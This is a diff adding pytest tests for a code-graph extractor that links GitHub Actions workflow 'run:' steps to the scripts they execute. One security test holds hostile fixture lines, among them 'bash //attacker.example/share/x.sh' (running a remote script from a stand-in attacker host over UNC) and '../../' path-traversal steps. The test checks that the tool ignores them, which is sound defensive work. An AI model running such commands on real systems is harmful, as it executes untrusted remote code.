@@ -260,3 +260,311 @@ def test_merge_key_sequence_earlier_map_wins(tmp_path):
     )
     # The earlier map (*a) wins, so the key node is *a*'s ``common`` at L2, not *b*'s L5.
     assert web_common["source_location"] == "L2"
+
+
+def test_github_workflow_run_steps_emit_script_edges(tmp_path):
+    """#5565: GitHub Actions workflow bash `run:` steps emit edges to scripts they execute."""
+    from graphify.affected import affected_nodes
+    from graphify.build import build_from_json
+    from graphify.detect import detect
+    from graphify.extract import extract
+
+    wf = tmp_path / ".github" / "workflows"
+    scripts = tmp_path / "scripts"
+    wf.mkdir(parents=True)
+    scripts.mkdir()
+
+    _write(
+        wf / "ci.yml",
+        "name: ci\n"
+        "on: push\n"
+        "jobs:\n"
+        "  check:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - run: bash scripts/check.sh\n"
+        "      - run: ./scripts/lint\n",
+    )
+    _write(scripts / "check.sh", "#!/usr/bin/env bash\necho checked\n")
+    _write(scripts / "lint", "#!/usr/bin/env bash\necho linted\n")
+
+    det = detect(tmp_path)
+    result = extract([Path(p) for p in det["files"]["code"]], cache_root=tmp_path, root=tmp_path, parallel=False)
+    calls = [
+        (e["source"], e["target"], e["source_location"])
+        for e in result["edges"]
+        if e.get("relation") == "calls"
+    ]
+    assert ("github_workflows_ci", "scripts_check_sh__entry", "L7") in calls, result["edges"]
+    assert ("github_workflows_ci", "scripts_lint__entry", "L8") in calls, result["edges"]
+
+    graph = build_from_json(result, directed=True)
+    for seed_id in ("scripts_check", "scripts_lint"):
+        hit_ids = {h.node_id for h in affected_nodes(graph, seed_id)}
+        assert "github_workflows_ci" in hit_ids, (seed_id, hit_ids)
+
+
+def test_github_workflow_multiline_flags_working_dir_and_source(tmp_path):
+    """#5565: Multiline `run: |`, flags (`-euo pipefail`), `working-directory`,
+    `$GITHUB_WORKSPACE`, Python interpreter invocations, and `source` calls."""
+    from graphify.extract import extract
+
+    wf = tmp_path / ".github" / "workflows"
+    scripts = tmp_path / "scripts"
+    sub = tmp_path / "sub"
+    wf.mkdir(parents=True)
+    scripts.mkdir()
+    sub.mkdir()
+
+    ci = _write(
+        wf / "ci.yml",
+        "name: ci\n"
+        "on: push\n"
+        "defaults:\n"
+        "  run:\n"
+        "    working-directory: sub\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - working-directory: .\n"
+        "        run: |\n"
+        "          bash -euo pipefail scripts/check.sh\n"
+        "          bash -c 'scripts/skip.sh'\n"
+        "          \"$GITHUB_WORKSPACE/scripts/lint\"\n"
+        "          python3 scripts/verify.py\n"
+        "          source scripts/lib.sh\n"
+        "          lib_helper\n"
+        "      - run: ./inner.sh\n",
+    )
+    check_sh = _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
+    skip_sh = _write(scripts / "skip.sh", "#!/usr/bin/env bash\necho skip\n")
+    lint = _write(scripts / "lint", "#!/usr/bin/env bash\necho lint\n")
+    verify_py = _write(scripts / "verify.py", "print('ok')\n")
+    lib_sh = _write(scripts / "lib.sh", "lib_helper() { echo helper; }\n")
+    inner_sh = _write(sub / "inner.sh", "#!/usr/bin/env bash\necho inner\n")
+
+    result = extract(
+        [ci, check_sh, skip_sh, lint, verify_py, lib_sh, inner_sh],
+        cache_root=tmp_path,
+        root=tmp_path,
+        parallel=False,
+    )
+    edges = {
+        (e["source"], e["relation"], e["target"], e.get("source_location"))
+        for e in result["edges"]
+    }
+    assert ("github_workflows_ci", "calls", "scripts_check_sh__entry", "L12") in edges
+    assert ("github_workflows_ci", "calls", "scripts_lint__entry", "L14") in edges
+    assert ("github_workflows_ci", "invokes", "scripts_verify", "L15") in edges
+    assert ("github_workflows_ci", "imports_from", "scripts_lib", "L16") in edges
+    assert ("github_workflows_ci", "calls", "scripts_lib_lib_helper", "L17") in edges
+    assert ("github_workflows_ci", "calls", "sub_inner_sh__entry", "L18") in edges
+    assert not any(
+        e["source"] == "github_workflows_ci" and e["target"] == "scripts_skip_sh__entry"
+        for e in result["edges"]
+    )
+
+
+def test_github_workflow_shell_and_runner_gates(tmp_path):
+    """#5565: Only bash/unset shells (on non-Windows runners) parse `run:` as bash."""
+    from graphify.extract import extract
+
+    wf = tmp_path / ".github" / "workflows"
+    scripts = tmp_path / "scripts"
+    wf.mkdir(parents=True)
+    scripts.mkdir()
+    check_sh = _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
+
+    ci = _write(
+        wf / "ci.yml",
+        "name: shells\n"
+        "on: push\n"
+        "jobs:\n"
+        "  linux:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - shell: pwsh\n"
+        "        run: bash scripts/check.sh\n"
+        "      - shell: python\n"
+        "        run: ./scripts/check.sh\n"
+        "      - shell: bash -eo pipefail {0}\n"
+        "        run: scripts/check.sh\n"
+        "  win:\n"
+        "    runs-on: windows-latest\n"
+        "    steps:\n"
+        "      - run: bash scripts/check.sh\n"
+        "  win_explicit_bash:\n"
+        "    runs-on: windows-latest\n"
+        "    steps:\n"
+        "      - shell: bash\n"
+        "        run: ./scripts/check.sh\n"
+        "  default_pwsh:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    defaults:\n"
+        "      run:\n"
+        "        shell: pwsh\n"
+        "    steps:\n"
+        "      - run: bash scripts/check.sh\n",
+    )
+
+    result = extract([ci, check_sh], cache_root=tmp_path, root=tmp_path, parallel=False)
+    script_calls = [
+        e["source_location"]
+        for e in result["edges"]
+        if e.get("relation") == "calls" and e.get("target") == "scripts_check_sh__entry"
+    ]
+    assert sorted(script_calls) == ["L12", "L21"]
+
+
+def test_github_workflow_fail_closed_and_security(tmp_path, monkeypatch):
+    """#5565: Expressions, missing/non-script targets, traversal, UNC paths,
+    and non-workflow YAMLs fail closed without probing outside the root."""
+    import builtins
+    import pathlib
+
+    wf = tmp_path / ".github" / "workflows"
+    scripts = tmp_path / "scripts"
+    wf.mkdir(parents=True)
+    scripts.mkdir()
+
+    outside = _write(tmp_path.parent / f"outside_{tmp_path.name}.sh", "echo outside\n")
+    _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
+    _write(scripts / "lint", "#!/usr/bin/env bash\necho lint\n")
+    _write(scripts / "notes.txt", "not a script\n")
+    _write(scripts / "plain", "no shebang here\n")
+
+    unc_hits: list[str] = []
+    for name in ("exists", "is_file", "is_dir"):
+        orig = getattr(pathlib.Path, name)
+
+        def make_probe(orig_fn):
+            def wrapper(self, *args, **kwargs):
+                if str(self)[:2] in ("//", "\\\\"):
+                    unc_hits.append(str(self))
+                return orig_fn(self, *args, **kwargs)
+            return wrapper
+
+        monkeypatch.setattr(pathlib.Path, name, make_probe(orig))
+
+    ci = _write(
+        wf / "sec.yml",
+        "name: sec\n"
+        "on: push\n"
+        "jobs:\n"
+        "  check:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - run: bash ${{ inputs.dir }}scripts/check.sh\n"
+        "      - run: bash \"${{ github.workspace }}/scripts/check.sh\"\n"
+        "      - run: |\n"
+        "          echo \"${{\n"
+        "            matrix.os\n"
+        "          }}\"\n"
+        "          ./scripts/lint\n"
+        f"      - run: bash ../../{outside.name}\n"
+        "      - run: bash //attacker.example/share/x.sh\n"
+        "      - run: ./scripts/notes.txt\n"
+        "      - run: ./scripts/plain\n"
+        "      - run: bash scripts/missing.sh\n"
+        "      - run: '# bash scripts/check.sh'\n"
+        "      - working-directory: ..\n"
+        f"        run: bash ./{outside.name}\n"
+        "      - working-directory: ${{ matrix.dir }}\n"
+        "        run: bash scripts/check.sh\n",
+    )
+    non_wf = _write(
+        tmp_path / "deploy.yml",
+        "jobs:\n  x:\n    steps:\n      - run: bash scripts/check.sh\n",
+    )
+
+    from graphify.extractors.base import set_active_scan_root
+
+    prev = set_active_scan_root(tmp_path.resolve())
+    try:
+        wf_res = extract_yaml(ci)
+        non_wf_res = extract_yaml(non_wf)
+    finally:
+        set_active_scan_root(prev)
+
+    assert unc_hits == [], f"UNC path was stat-ed: {unc_hits}"
+    script_edges = [e for e in wf_res["edges"] if e["relation"] != "contains"]
+    assert len(script_edges) == 1, script_edges
+    assert script_edges[0]["source_location"] == "L13"
+    assert Path(script_edges[0]["target_file"]).resolve() == (scripts / "lint").resolve()
+    assert not any(e["relation"] != "contains" for e in non_wf_res["edges"])
+
+    # Missing tree_sitter_bash degrades cleanly without breaking YAML extraction.
+    real_import = builtins.__import__
+
+    def no_ts_bash(name, *args, **kwargs):
+        if name == "tree_sitter_bash":
+            raise ImportError("mocked")
+        return real_import(name, *args, **kwargs)
+
+    monkeypatch.setattr(builtins, "__import__", no_ts_bash)
+    degraded = extract_yaml(ci)
+    assert "error" not in degraded
+    assert any(n["label"] == "ci" or n["label"] == "sec.yml" for n in degraded["nodes"])
+
+
+def test_composite_action_run_steps_emit_script_edges(tmp_path):
+    """#5565: Composite action `action.yml` bash steps emit script edges (explicit shell required)."""
+    from graphify.extract import extract
+
+    act_dir = tmp_path / ".github" / "actions" / "check"
+    scripts = tmp_path / "scripts"
+    act_dir.mkdir(parents=True)
+    scripts.mkdir()
+
+    action_yml = _write(
+        act_dir / "action.yml",
+        "name: Check\n"
+        "runs:\n"
+        "  using: composite\n"
+        "  steps:\n"
+        "    - shell: bash\n"
+        "      run: bash scripts/check.sh\n"
+        "    - shell: pwsh\n"
+        "      run: bash scripts/skip.sh\n"
+        "    - run: bash scripts/skip.sh\n",
+    )
+    check_sh = _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
+    skip_sh = _write(scripts / "skip.sh", "#!/usr/bin/env bash\necho skip\n")
+
+    result = extract([action_yml, check_sh, skip_sh], cache_root=tmp_path, root=tmp_path, parallel=False)
+    calls = [e for e in result["edges"] if e.get("relation") == "calls"]
+    assert len(calls) == 1
+    assert calls[0]["target"] == "scripts_check_sh__entry"
+    assert calls[0]["source_location"] == "L6"
+
+
+def test_github_workflow_parses_in_memory_without_shell_or_tempfile(tmp_path, monkeypatch):
+    """#5565: Workflow bash parsing never writes temp files or spawns subprocesses."""
+    import os
+    import subprocess
+    import tempfile
+
+    def boom(*args, **kwargs):
+        raise AssertionError("forbidden execution or tempfile")
+
+    monkeypatch.setattr(tempfile, "NamedTemporaryFile", boom)
+    monkeypatch.setattr(tempfile, "mkstemp", boom)
+    monkeypatch.setattr(subprocess, "run", boom)
+    monkeypatch.setattr(subprocess, "Popen", boom)
+    monkeypatch.setattr(os, "system", boom)
+
+    wf = tmp_path / ".github" / "workflows"
+    scripts = tmp_path / "scripts"
+    wf.mkdir(parents=True)
+    scripts.mkdir()
+    _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
+    ci = _write(
+        wf / "ci.yml",
+        "name: ci\non: push\njobs:\n  check:\n    runs-on: ubuntu-latest\n"
+        "    steps:\n      - run: bash scripts/check.sh\n",
+    )
+    first = extract_yaml(ci)
+    second = extract_yaml(ci)
+    assert first == second
+    assert any(e["relation"] == "calls" for e in first["edges"])
